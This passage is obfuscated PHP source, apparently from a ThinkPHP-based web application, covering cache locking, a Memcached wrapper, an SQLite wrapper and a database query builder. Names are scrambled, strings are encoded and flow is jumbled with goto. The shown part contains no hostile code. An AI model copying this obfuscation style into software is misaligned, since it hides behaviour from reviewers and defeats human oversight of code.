$cµÀâñ‚óà = $GLOBALS[$eËåÍÎÛ°˜[6]][$eËåÍÎÛ°˜[337]]; goto dèçÔ•ÉØ•; C±µ†ÕÔæ: } private static function key($Eïª‡­Íé“) { return $_SERVER[Æ][767] . Cache::key($Eïª‡­Íé“); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($C—ãê›Š‚ = '') { self::$errorMsg = $C—ãê›Š‚; } public static function lockGlobal($d°‰ã–¥•‚, $D’ãí”çÅ°) { return self::lock($d°‰ã–¥•‚, $D’ãí”çÅ°, !0); } public static function lock($f‚¶‚ç¢Ö‰, $A˜ğß¬ñ±œ = false, $F•ÉË¼é´‡ = false) { goto e¦ó‰›é¿; B–Ùá¨Ï¤Æ: if (!$F•ÉË¼é´‡) { self::$lockItem[$aÛÅ†æÅ§‹] = !0; } return $fËµ¶¿èÔ; goto aÎÓöìàÀ×; e¦ó‰›é¿: $c‚ÈíÑ™ñµ =& $_SERVER[Æ]; $Fí–œºÂñó = self::init(); $aÛÅ†æÅ§‹ = self::key($f‚¶‚ç¢Ö‰); goto dÃ·”¸‚¥; dÃ·”¸‚¥: $A˜ğß¬ñ±œ = $A˜ğß¬ñ±œ ? $A˜ğß¬ñ±œ : self::$timeout; $fËµ¶¿èÔ = $Fí–œºÂñó->lock($aÛÅ†æÅ§‹, $A˜ğß¬ñ±œ); if (!$fËµ¶¿èÔ) { $eëŒ³Ì²¬Ù = $c‚ÈíÑ™ñµ[768] . $A˜ğß¬ñ±œ . $c‚ÈíÑ™ñµ[67] . self::$errorMsg . $c‚ÈíÑ™ñµ[67] . get_caller_msg(); $Dö¸§…âÕØ = "\114\157\x63\x6b\40\141\x63\x74\151\157\x6e\x3a\x20{$aÛÅ†æÅ§‹}\40\x74\151\155\145\x6f\165\164\x2c\x6f\166\x65\x72\40{$A˜ğß¬ñ±œ}\x20\163"; $Dö¸§…âÕØ = self::$errorMsg ? self::$errorMsg : $aïˆÒ©£Ø’; write_log($eëŒ³Ì²¬Ù, $c‚ÈíÑ™ñµ[769]); show_json($Dö¸§…âÕØ, !1); } goto B–Ùá¨Ï¤Æ; aÎÓöìàÀ×: } public static function lockGet($Fªï«ˆßƒ–) { $E­Ûê¹æòó = self::key($Fªï«ˆßƒ–); if (self::$lockItem[$E­Ûê¹æòó]) { return self::$lockItem[$E­Ûê¹æòó]; } return self::init()->lockGet($E­Ûê¹æòó); } public static function unlock($CŸàÊÁ¢—Å) { $AĞµçÔ‡¡ = self::key($CŸàÊÁ¢—Å); self::$lockItem[$AĞµçÔ‡¡] = null; return self::init()->unlock($AĞµçÔ‡¡); } public static function unlockRuntime() { $aÊ›ÅØš =& $_SERVER[Æ]; $b®¶µíÈ = self::init(); $d£öİ­æ¢ = !1; foreach (self::$lockItem as $CÁØé†Ÿóœ => $D¼çØòù¡²) { if (!$D¼çØòù¡²) { continue; } $b®¶µíÈ->unlock($CÁØé†Ÿóœ); if (!$d£öİ­æ¢) { $d£öİ­æ¢ = !0; write_log($aÊ›ÅØš[770] . $CÁØé†Ÿóœ . $aÊ›ÅØš[67] . get_caller_msg(), $aÊ›ÅØš[769]); continue; } write_log($aÊ›ÅØš[770] . $CÁØé†Ÿóœ, $aÊ›ÅØš[769]); } } } goto FÅ·÷ŞÜ‹—; Dù‹¶™¢µÎ: class CacheLockMemcached { public function lock($F…ÙÛŠ­’‘, $bø‚é¹İÉ‡ = 0) { $c¶Â¤“ì = Cache::init(); $dÛğÊ¹Ñ‰ = microtime(!0) + $bø‚é¹İÉ‡; while (microtime(!0) < $dÛğÊ¹Ñ‰) { $AÅòø•èµĞ = $c¶Â¤“ì->get($F…ÙÛŠ­’‘); if (!$AÅòø•èµĞ || $AÅòø•èµĞ < microtime(!0)) { $d¡°ä“‰Õ = $c¶Â¤“ì->handle->add($F…ÙÛŠ­’‘, $dÛğÊ¹Ñ‰, $bø‚é¹İÉ‡); if ($d¡°ä“‰Õ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a„ƒà°â£Ê) { return Cache::init()->get($a„ƒà°â£Ê); } public function unlock($båÎëˆ³µ) { return Cache::init()->remove($båÎëˆ³µ); } } class CacheLockDatabase { public function lock($eâ¬İ•¾ñÎ, $Aº”Ø×¥Ü± = 0) { $FïÖÎ¯†¦Œ = Model($_SERVER[Æ][754]); $c‹ã¡„…ì = microtime(!0) + $Aº”Ø×¥Ü±; while (microtime(!0) < $c‹ã¡„…ì) { $bª¤ù—¡½ = $FïÖÎ¯†¦Œ->get($eâ¬İ•¾ñÎ); if (!$bª¤ù—¡½ || $bª¤ù—¡½ < microtime(!0)) { $E©·–±Ì–¥ = $FïÖÎ¯†¦Œ->set($eâ¬İ•¾ñÎ, $c‹ã¡„…ì); if ($E©·–±Ì–¥) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($FØµíÕ²½) { return Model($_SERVER[Æ][754])->get($FØµíÕ²½); } public function unlock($AàÉ»ø­é) { Model($_SERVER[Æ][754])->remove($AàÉ»ø­é); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($D§„½ÍõÚ‹, $D–ÖÉ­åôƒ) { $Eí•ÃâÅÂ =& $_SERVER[Æ]; if (!class_exists($Eí•ÃâÅÂ[775])) { show_json($Eí•ÃâÅÂ[776], !1); } $this->cacheTime = $D–ÖÉ­åôƒ; $this->handle = new Memcached(); if (is_array($D§„½ÍõÚ‹[$Eí•ÃâÅÂ[777]]) && count($D§„½ÍõÚ‹[$Eí•ÃâÅÂ[777]]) >= 1) { foreach ($D§„½ÍõÚ‹[$Eí•ÃâÅÂ[777]] as $fèÑ¦ìãŞ») { $Fï‰¿¥‡öØ = explode($Eí•ÃâÅÂ[4], $fèÑ¦ìãŞ»); $this->handle->addServer($Fï‰¿¥‡öØ[0], $Fï‰¿¥‡öØ[1]); } } else { $this->handle->addServer($D§„½ÍõÚ‹[$Eí•ÃâÅÂ[169]], $D§„½ÍõÚ‹[$Eí•ÃâÅÂ[170]]); } } public function set($E›ë”´ˆë¤, $Fù„¯‡×Ù½, $FèñØŒÈî = false) { $FèñØŒÈî = $FèñØŒÈî ? $FèñØŒÈî : $this->cacheTime; return $this->handle->set($E›ë”´ˆë¤, $Fù„¯‡×Ù½, $FèñØŒÈî); } public function get($cÙªà”§›õ) { return $this->handle->get($cÙªà”§›õ); } public function remove($cÒ‰œòÜÖ“) { return $this->handle->delete($cÒ‰œòÜÖ“); } public function deleteAll() { return $this->handle->flush(); } } goto A½Îåø¢â; b†¶©‚æ¬†: class DbSqlite3 extends DbSqlite3Base { public function query($DĞÍÎ’ã) { goto DÔ‘‚ñ‡›; f³ïë¶™¸›: if (!$FÄ—«İê©Ê) { return !1; } if (flock($FÄ—«İê©Ê, LOCK_EX)) { $FÈ¿Ä”ñÙÚ = parent::query($DĞÍÎ’ã); flock($FÄ—«İê©Ê, LOCK_UN); fclose($FÄ—«İê©Ê); return $FÈ¿Ä”ñÙÚ; } flock($FÄ—«İê©Ê, LOCK_UN); goto E¶À¥“§òå; E¶À¥“§òå: fclose($FÄ—«İê©Ê); show_json($B•¬ŸŸÍ¤[875], !1); return !1; goto d‹Ğ‹°†¶; DÔ‘‚ñ‡›: $B•¬ŸŸÍ¤ =& $_SERVER[Æ]; $Dğ‚§òêß = DATA_PATH . $B•¬ŸŸÍ¤[873]; $FÄ—«İê©Ê = fopen($Dğ‚§òêß, $B•¬ŸŸÍ¤[874]); goto f³ïë¶™¸›; d‹Ğ‹°†¶: } public function execute($a‡á‡†ÀÏ) { goto aàÆ¬ï…‡Ñ; DÊ†ÛÒçŒ: if (!$Dî˜ìˆ–Î) { return !1; } if (flock($Dî˜ìˆ–Î, LOCK_EX)) { $Bİ¬ö°•æ = parent::execute($a‡á‡†ÀÏ); flock($Dî˜ìˆ–Î, LOCK_UN); fclose($Dî˜ìˆ–Î); return $Bİ¬ö°•æ; } flock($Dî˜ìˆ–Î, LOCK_UN); goto Aƒ­†èÌÎÍ; aàÆ¬ï…‡Ñ: $B‰ÑáÅ¯ÌØ =& $_SERVER[Æ]; $C˜­‚ïÇ£² = DATA_PATH . $B‰ÑáÅ¯ÌØ[873]; $Dî˜ìˆ–Î = fopen($C˜­‚ïÇ£², $B‰ÑáÅ¯ÌØ[874]); goto DÊ†ÛÒçŒ; Aƒ­†èÌÎÍ: fclose($Dî˜ìˆ–Î); show_json($B‰ÑáÅ¯ÌØ[875], !1); return !1; goto C‡ˆåÛÕ´; C‡ˆåÛÕ´: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\x65\161" => "\74\76", "\x67\164" => "\x3e", "\x65\147\164" => "\76\75", "\154\164" => "\x3c", "\x65\154\164" => "\74\75", "\x6e\157\164\x6c\x69\x6b\x65" => "\x4e\x4f\124\40\114\x49\x4b\105", "\154\x69\x6b\145" => "\x4c\x49\113\105", "\151\156" => "\x49\116", "\x6e\x6f\164\x69\156" => "\116\x4f\124\x20\x49\116", "\156\157\164\40\x69\156" => "\116\x4f\x54\x20\111\x4e", "\142\145\x74\167\145\145\x6e" => "\102\105\124\127\x45\105\x4e", "\x6e\157\164\142\145\164\x77\x65\145\x6e" => "\x4e\117\124\x20\x42\x45\x54\x57\105\x45\116", "\156\x6f\164\x20\142\x65\164\167\145\145\x6e" => "\x4e\x4f\x54\40\102\105\x54\x57\105\105\116"); protected $selectSql = "\123\x45\114\x45\x43\x54\x25\104\x49\123\x54\111\116\103\x54\45\40\x25\x46\x49\x45\114\104\x25\x20\106\122\117\115\40\x25\x54\x41\x42\114\105\x25\45\x4a\x4f\111\x4e\45\45\x57\110\x45\122\105\x25\x25\107\122\117\125\120\45\45\x48\101\x56\111\x4e\107\x25\45\x4f\x52\x44\105\x52\x25\45\114\111\x4d\111\124\x25\40\45\125\x4e\111\x4f\x4e\45\45\103\x4f\115\x4d\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $AÕ¸Å©‡øª = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Æ][876], $AÕ¸Å©‡øª); } public function factory($Eó‘ÙÓÈô = '') { goto aİ‘ÒˆÈÕ; fØË‹Á¹î¶: return $Cá¢µ…³™; goto e£Ïœ¢­»; aİ‘ÒˆÈÕ: $eÉÜØ×š¶á =& $_SERVER[Æ]; $Eó‘ÙÓÈô = $this->parseConfig($Eó‘ÙÓÈô); if (empty($Eó‘ÙÓÈô[$eÉÜØ×š¶á[877]])) { think_exception(think_lang($eÉÜØ×š¶á[878])); } goto c²Ï›ì…È; c²Ï›ì…È: $this->dbType = ucwords(strtolower($Eó‘ÙÓÈô[$eÉÜØ×š¶á[877]])); $bÚ½ëøÉê = $eÉÜØ×š¶á[879] . $this->dbType; if (class_exists($bÚ½ëøÉê)) { $Cá¢µ…³™ = new $bÚ½ëøÉê($Eó‘ÙÓÈô); if ($eÉÜØ×š¶á[722] != strtolower($Eó‘ÙÓÈô[$eÉÜØ×š¶á[877]])) { $Cá¢µ…³™->dbType = strtoupper($this->dbType); } else { $Cá¢µ…³™->dbType = $this->_getDsnType($Eó‘ÙÓÈô[$eÉÜØ×š¶á[829]]); } } else { think_exception(think_lang($eÉÜØ×š¶á[880]) . $eÉÜØ×š¶á[881] . $bÚ½ëøÉê); } goto fØË‹Á¹î¶; e£Ïœ¢­»: } public function __call($D¾í‚…ŒÏ¶, $dï«ÙÎò‡) { if (method_exists($this, $D¾í‚…ŒÏ¶)) { return call_user_func_array(array($this, $D¾í‚…ŒÏ¶), $dï«ÙÎò‡); } } protected function _getDsnType($Eˆñ¶êë°À) { $fë¤Œ«½çò = explode($_SERVER[Æ][4], $Eˆñ¶êë°À); $DÒƒ¯Œ©ÏÖ = strtoupper(trim($fë¤Œ«½çò[0])); return $DÒƒ¯Œ©ÏÖ; } private function parseConfig($câÖ“ß¯±Ë = '') { $AÇ¡‰´Ú‚Ş =& $_SERVER[Æ]; if (!empty($câÖ“ß¯±Ë) && is_string($câÖ“ß¯±Ë)) { $câÖ“ß¯±Ë = $this->parseDSN($câÖ“ß¯±Ë); } elseif (is_array($câÖ“ß¯±Ë)) { $câÖ“ß¯±Ë = array_change_key_case($câÖ“ß¯±Ë); $câÖ“ß¯±Ë = array($AÇ¡‰´Ú‚Ş[877] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[721]], $AÇ¡‰´Ú‚Ş[802] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[882]], $AÇ¡‰´Ú‚Ş[803] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[883]], $AÇ¡‰´Ú‚Ş[800] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[884]], $AÇ¡‰´Ú‚Ş[801] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[885]], $AÇ¡‰´Ú‚Ş[17] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[886]], $AÇ¡‰´Ú‚Ş[829] => $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[723]], $AÇ¡‰´Ú‚Ş[13] => isset($câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[887]]) ? $câÖ“ß¯±Ë[$AÇ¡‰´Ú‚Ş[887]] : array()); } elseif (empty($câÖ“ß¯±Ë)) { if (think_config($AÇ¡‰´Ú‚Ş[888]) && $AÇ¡‰´Ú‚Ş[722] != strtolower(think_config($AÇ¡‰´Ú‚Ş[889]))) { $câÖ“ß¯±Ë = $this->parseDSN(think_config($AÇ¡‰´Ú‚Ş[888])); } else { $câÖ“ß¯±Ë = array($AÇ¡‰´Ú‚Ş[877] => think_config($AÇ¡‰´Ú‚Ş[889]), $AÇ¡‰´Ú‚Ş[802] => think_config($AÇ¡‰´Ú‚Ş[890]), $AÇ¡‰´Ú‚Ş[803] => think_config($AÇ¡‰´Ú‚Ş[891]), $AÇ¡‰´Ú‚Ş[800] => think_config($AÇ¡‰´Ú‚Ş[892]), $AÇ¡‰´Ú‚Ş[801] => think_config($AÇ¡‰´Ú‚Ş[893]), $AÇ¡‰´Ú‚Ş[17] => think_config($AÇ¡‰´Ú‚Ş[234]), $AÇ¡‰´Ú‚Ş[829] => think_config($AÇ¡‰´Ú‚Ş[888]), $AÇ¡‰´Ú‚Ş[13] => think_config($AÇ¡‰´Ú‚Ş[894])); } } return $câÖ“ß¯±Ë; } protected function initConnect($cĞŞÄˆª‡ = true) { if (1 == think_config($_SERVER[Æ][18])) { $this->_linkID = $this->multiConnect($cĞŞÄˆª‡); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($Dƒİ‰»Ù‡í = false) { $eœù°Åİö¡ =& $_SERVER[Æ]; static $f’„ô‹ò¿¤ = array(); if (empty($f’„ô‹ò¿¤)) { foreach ($this->config as $F°ŒÖ £´ => $eˆ·ĞŒøƒ) { $f’„ô‹ò¿¤[$F°ŒÖ £´] = explode($eœù°Åİö¡[47], $eˆ·ĞŒøƒ); } } if (think_config($eœù°Åİö¡[895])) { if ($Dƒİ‰»Ù‡í) { $añ¥º·……¶ = floor(mt_rand(0, think_config($eœù°Åİö¡[896]) - 1)); } else { if (is_numeric(think_config($eœù°Åİö¡[897]))) { $añ¥º·……¶ = think_config($eœù°Åİö¡[897]); } else { $añ¥º·……¶ = floor(mt_rand(think_config($eœù°Åİö¡[896]), count($f’„ô‹ò¿¤[$eœù°Åİö¡[800]]) - 1)); } } } else { $añ¥º·……¶ = floor(mt_rand(0, count($f’„ô‹ò¿¤[$eœù°Åİö¡[800]]) - 1)); } $a“Ù†ùÕªƒ = array($eœù°Åİö¡[802] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[802]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[802]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[802]][0], $eœù°Åİö¡[803] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[803]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[803]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[803]][0], $eœù°Åİö¡[800] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[800]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[800]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[800]][0], $eœù°Åİö¡[801] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[801]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[801]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[801]][0], $eœù°Åİö¡[17] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[17]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[17]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[17]][0], $eœù°Åİö¡[829] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[829]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[829]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[829]][0], $eœù°Åİö¡[13] => isset($f’„ô‹ò¿¤[$eœù°Åİö¡[13]][$añ¥º·……¶]) ? $f’„ô‹ò¿¤[$eœù°Åİö¡[13]][$añ¥º·……¶] : $f’„ô‹ò¿¤[$eœù°Åİö¡[13]][0]); return $this->connect($a“Ù†ùÕªƒ, $añ¥º·……¶); } public function parseDSN($C‰õƒÊ»Ü£) { $bèÄã‰°Û¯ =& $_SERVER[Æ]; if (empty($C‰õƒÊ»Ü£)) { return !1; } $Aèø™É¤†Ô = parse_url($C‰õƒÊ»Ü£); if ($Aèø™É¤†Ô[$bèÄã‰°Û¯[168]]) { $DÂ¥ŞäÏ… = array($bèÄã‰°Û¯[877] => $Aèø™É¤†Ô[$bèÄã‰°Û¯[168]], $bèÄã‰°Û¯[802] => isset($Aèø™É¤†Ô[$bèÄã‰°Û¯[535]]) ? $Aèø™É¤†Ô[$bèÄã‰°Û¯[535]] : $bèÄã‰°Û¯[33], $bèÄã‰°Û¯[803] => isset($Aèø™É¤†Ô[$bèÄã‰°Û¯[898]]) ? $Aèø™É¤†Ô[$bèÄã‰°Û¯[898]] : $bèÄã‰°Û¯[33], $bèÄã‰°Û¯[800] => isset($Aèø™É¤†Ô[$bèÄã‰°Û¯[169]]) ? $Aèø™É¤†Ô[$bèÄã‰°Û¯[169]] : $bèÄã‰°Û¯[33], $bèÄã‰°Û¯[801] => isset($Aèø™É¤†Ô[$bèÄã‰°Û¯[170]]) ? $Aèø™É¤†Ô[$bèÄã‰°Û¯[170]] : $bèÄã‰°Û¯[33], $bèÄã‰°Û¯[17] => isset($Aèø™É¤†Ô[$bèÄã‰°Û¯[75]]) ? substr($Aèø™É¤†Ô[$bèÄã‰°Û¯[75]], 1) : $bèÄã‰°Û¯[33]); } else { preg_match($bèÄã‰°Û¯[899], trim($C‰õƒÊ»Ü£), $eôÅçïÎ…¬); $DÂ¥ŞäÏ… = array($bèÄã‰°Û¯[877] => $eôÅçïÎ…¬[1], $bèÄã‰°Û¯[802] => $eôÅçïÎ…¬[2], $bèÄã‰°Û¯[803] => $eôÅçïÎ…¬[3], $bèÄã‰°Û¯[800] => $eôÅçïÎ…¬[4], $bèÄã‰°Û¯[801] => $eôÅçïÎ…¬[5], $bèÄã‰°Û¯[17] => $eôÅçïÎ…¬[6]); } $DÂ¥ŞäÏ…[$bèÄã‰°Û¯[829]] = $bèÄã‰°Û¯[33]; return $DÂ¥ŞäÏ…; } protected function debug() { $BºÈë‹µˆê =& $_SERVER[Æ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BºÈë‹µˆê[900]; if (think_config($BºÈë‹µˆê[901])) { think_status($BºÈë‹µˆê[902]); think_trace($this->queryStr . $BºÈë‹µˆê[903] . think_status($BºÈë‹µˆê[20], $BºÈë‹µˆê[902], 6) . $BºÈë‹µˆê[904], $BºÈë‹µˆê[33], $BºÈë‹µˆê[905]); } } protected function parseLock($EÌ‹ßÅñ¹ƒ = false) { $aØ…¥±¤Ì¥ =& $_SERVER[Æ]; if (!$EÌ‹ßÅñ¹ƒ) { return $aØ…¥±¤Ì¥[33]; } if ($aØ…¥±¤Ì¥[831] == $this->dbType) { return $aØ…¥±¤Ì¥[906]; } return $aØ…¥±¤Ì¥[907]; } protected function parseSet($fÊˆ’´®­á) { $D†‹®µçÜ­ =& $_SERVER[Æ]; foreach ($fÊˆ’´®­á as $F™ÚÑŠ§ìª => $eÎŞ‹ñŠ¬) { if (is_array($eÎŞ‹ñŠ¬) && $D†‹®µçÜ­[285] == $eÎŞ‹ñŠ¬[0]) { $bÃåŒÜÍ…¿[] = $this->parseKey($F™ÚÑŠ§ìª) . $D†‹®µçÜ­[908] . $eÎŞ‹ñŠ¬[1]; } elseif (is_scalar($eÎŞ‹ñŠ¬) || is_null($eÎŞ‹ñŠ¬)) { $bÃåŒÜÍ…¿[] = $this->parseKey($F™ÚÑŠ§ìª) . $D†‹®µçÜ­[908] . $this->parseValue($eÎŞ‹ñŠ¬); } } return $D†‹®µçÜ­[909] . implode($D†‹®µçÜ­[47], $bÃåŒÜÍ…¿); } protected function bindParam($açâôŒÔ, $bÏˆÏËÓ–) { $this->bind[$_SERVER[Æ][4] . $açâôŒÔ] = $bÏˆÏËÓ–; } protected function parseBind($FÌ” Ÿ……Ã) { $FÌ” Ÿ……Ã = array_merge($this->bind, $FÌ” Ÿ……Ã); $this->bind = array(); return $FÌ” Ÿ……Ã; } function parseKey(&$EÍ£·ñÌÍğ, $d¨§áéº‘Î = true) { if ($d¨§áéº‘Î) { $EÍ£·ñÌÍğ = $this->parseKeyCheck($EÍ£·ñÌÍğ); } return $EÍ£·ñÌÍğ; } function parseKeyCheck($aÆ·ñ¾Ø¯¶) { $AëôÊƒõ­ =& $_SERVER[Æ]; $aÆ·ñ¾Ø¯¶ = trim($aÆ·ñ¾Ø¯¶); if (!preg_match($AëôÊƒõ­[910], $aÆ·ñ¾Ø¯¶)) { think_exception($AëôÊƒõ­[911] . $aÆ·ñ¾Ø¯¶); } return $aÆ·ñ¾Ø¯¶; } protected function parseValue($Fß±¥®ÃŠ¢) { $e†Ø‰Í……‘ =& $_SERVER[Æ]; if (is_string($Fß±¥®ÃŠ¢)) { $Fß±¥®ÃŠ¢ = $e†Ø‰Í……‘[870] . $this->escapeString($Fß±¥®ÃŠ¢) . $e†Ø‰Í……‘[870]; } elseif (isset($Fß±¥®ÃŠ¢[0]) && is_string($Fß±¥®ÃŠ¢[0]) && strtolower($Fß±¥®ÃŠ¢[0]) == $e†Ø‰Í……‘[285]) { $Fß±¥®ÃŠ¢ = $this->escapeString($Fß±¥®ÃŠ¢[1]); } elseif (is_array($Fß±¥®ÃŠ¢)) { $Fß±¥®ÃŠ¢ = array_map(array($this, $e†Ø‰Í……‘[871]), $Fß±¥®ÃŠ¢); } elseif (is_bool($Fß±¥®ÃŠ¢)) { $Fß±¥®ÃŠ¢ = $Fß±¥®ÃŠ¢ ? $e†Ø‰Í……‘[83] : $e†Ø‰Í……‘[468]; } elseif (is_null($Fß±¥®ÃŠ¢)) { $Fß±¥®ÃŠ¢ = $e†Ø‰Í……‘[99]; } return $Fß±¥®ÃŠ¢; } protected function parseField($BÜƒÒ»Š»¹) { $FÔšË¤”÷ =& $_SERVER[Æ]; if (is_string($BÜƒÒ»Š»¹) && strpos($BÜƒÒ»Š»¹, $FÔšË¤”÷[47])) { $BÜƒÒ»Š»¹ = explode($FÔšË¤”÷[47], $BÜƒÒ»Š»¹); } if (is_array($BÜƒÒ»Š»¹)) { $BËµÔ‡Ö² = array(); foreach ($BÜƒÒ»Š»¹ as $f¥œ†·©ŠŠ => $e‘‚¡ôÈá) { if (!is_numeric($f¥œ†·©ŠŠ)) { $BËµÔ‡Ö²[] = $this->parseKey($f¥œ†·©ŠŠ) . $FÔšË¤”÷[912] . $this->parseKey($e‘‚¡ôÈá); } else { $BËµÔ‡Ö²[] = $this->parseKey($e‘‚¡ôÈá); } } $B‰¾¨–Ñ¢ = implode($FÔšË¤”÷[47], $BËµÔ‡Ö²); } elseif (is_string($BÜƒÒ»Š»¹) && !empty($BÜƒÒ»Š»¹)) { $B‰¾¨–Ñ¢ = $BÜƒÒ»Š»¹; } else { $B‰¾¨–Ñ¢ = $FÔšË¤”÷[176]; } return $B‰¾¨–Ñ¢; } protected function parseTable($cäè¦ˆ­ôÍ) { $E¨¿Ô«ëÇÒ =& $_SERVER[Æ]; if (is_array($cäè¦ˆ­ôÍ)) { $BäÛí‰ÄŠÕ = array(); foreach ($cäè¦ˆ­ôÍ as $A¨ìÁÀâƒá => $fî·Æºì£†) { if (!is_numeric($A¨ìÁÀâƒá)) { $BäÛí‰ÄŠÕ[] = $this->parseKey($A¨ìÁÀâƒá) . $E¨¿Ô«ëÇÒ[50] . $this->parseKey($fî·Æºì£†); } else { $BäÛí‰ÄŠÕ[] = $this->parseKey($A¨ìÁÀâƒá); } } $cäè¦ˆ­ôÍ = $BäÛí‰ÄŠÕ; } elseif (is_string($cäè¦ˆ­ôÍ)) { if (strstr($cäè¦ˆ­ôÍ, $E¨¿Ô«ëÇÒ[50])) { return $cäè¦ˆ­ôÍ; } $cäè¦ˆ­ôÍ = explode($E¨¿Ô«ëÇÒ[47], $cäè¦ˆ­ôÍ); array_walk($cäè¦ˆ­ôÍ, array($this, $E¨¿Ô«ëÇÒ[819])); } return $E¨¿Ô«ëÇÒ[913] . trim(implode($E¨¿Ô«ëÇÒ[914], $cäè¦ˆ­ôÍ), $E¨¿Ô«ëÇÒ[825]) . $E¨¿Ô«ëÇÒ[913]; } protected function parseWhere($AÁÉÒ£³¼ë) { $b×³Ãƒª  =& $_SERVER[Æ]; $a¦«­°ç´ = $b×³Ãƒª [33]; if (is_string($AÁÉÒ£³¼ë)) { $a¦«­°ç´ = $AÁÉÒ£³¼ë; } else { $eÚÂ§ÊÃŠà = isset($AÁÉÒ£³¼ë[$b×³Ãƒª [915]]) ? strtoupper($AÁÉÒ£³¼ë[$b×³Ãƒª [915]]) : $b×³Ãƒª [33]; if (in_array($eÚÂ§ÊÃŠà, array($b×³Ãƒª [916], $b×³Ãƒª [917], $b×³Ãƒª [918]))) { $eÚÂ§ÊÃŠà = $b×³Ãƒª [50] . $eÚÂ§ÊÃŠà . $b×³Ãƒª [50]; unset($AÁÉÒ£³¼ë[$b×³Ãƒª [915]]); } else { $eÚÂ§ÊÃŠà = $b×³Ãƒª [919]; } foreach ($AÁÉÒ£³¼ë as $Báî×øÉŠ· => $fë‰èÍÑé) { $a¦«­°ç´ .= $b×³Ãƒª [265]; if (is_numeric($Báî×øÉŠ·)) { $Báî×øÉŠ· = $b×³Ãƒª [920]; } if (0 === strpos($Báî×øÉŠ·, $b×³Ãƒª [70])) { $a¦«­°ç´ .= $this->parseThinkWhere($Báî×øÉŠ·, $fë‰èÍÑé); } else { if (!preg_match($b×³Ãƒª [921], trim($Báî×øÉŠ·))) { think_exception(think_lang($b×³Ãƒª [922]) . $b×³Ãƒª [4] . $Báî×øÉŠ·); } $fÖ¥‚·ˆØŞ = is_array($fë‰èÍÑé) && isset($fë‰èÍÑé[$b×³Ãƒª [923]]); $Báî×øÉŠ· = trim($Báî×øÉŠ·); if (strpos($Báî×øÉŠ·, $b×³Ãƒª [271])) { $BÕ¥®—÷¤ö = explode($b×³Ãƒª [271], $Báî×øÉŠ·); $cœÃÑ²¾ = array(); foreach ($BÕ¥®—÷¤ö as $B¼¸ƒÎÃÏ’ => $eÏ¥’”Á”“) { $BÆšùÆ•–• = $fÖ¥‚·ˆØŞ ? $fë‰èÍÑé[$B¼¸ƒÎÃÏ’] : $fë‰èÍÑé; $cœÃÑ²¾[] = $b×³Ãƒª [248] . $this->parseWhereItem($this->parseKey($eÏ¥’”Á”“), $BÆšùÆ•–•) . $b×³Ãƒª [818]; } $a¦«­°ç´ .= implode($b×³Ãƒª [924], $cœÃÑ²¾); } elseif (strpos($Báî×øÉŠ·, $b×³Ãƒª [272])) { $BÕ¥®—÷¤ö = explode($b×³Ãƒª [272], $Báî×øÉŠ·); $cœÃÑ²¾ = array(); foreach ($BÕ¥®—÷¤ö as $B¼¸ƒÎÃÏ’ => $eÏ¥’”Á”“) { $BÆšùÆ•–• = $fÖ¥‚·ˆØŞ ? $fë‰èÍÑé[$B¼¸ƒÎÃÏ’] : $fë‰èÍÑé; $cœÃÑ²¾[] = $b×³Ãƒª [248] . $this->parseWhereItem($this->parseKey($eÏ¥’”Á”“), $BÆšùÆ•–•) . $b×³Ãƒª [818]; } $a¦«­°ç´ .= implode($b×³Ãƒª [919], $cœÃÑ²¾); } else { $a¦«­°ç´ .= $this->parseWhereItem($this->parseKey($Báî×øÉŠ·), $fë‰èÍÑé); } } $a¦«­°ç´ .= $b×³Ãƒª [266] . $eÚÂ§ÊÃŠà; } $a¦«­°ç´ = substr($a¦«­°ç´, 0, -strlen($eÚÂ§ÊÃŠà)); } return empty($a¦«­°ç´) ? $b×³Ãƒª [33] : $b×³Ãƒª [925] . $a¦«­°ç´; } protected function parseWhereItem($DÔ²«İŠøÅ, $añÑÂèšª) { $Dˆ³ÆÖ¦ô® =& $_SERVER[Æ]; $c»è›°¸ = $Dˆ³ÆÖ¦ô®[33]; if (is_array($añÑÂèšª)) { if 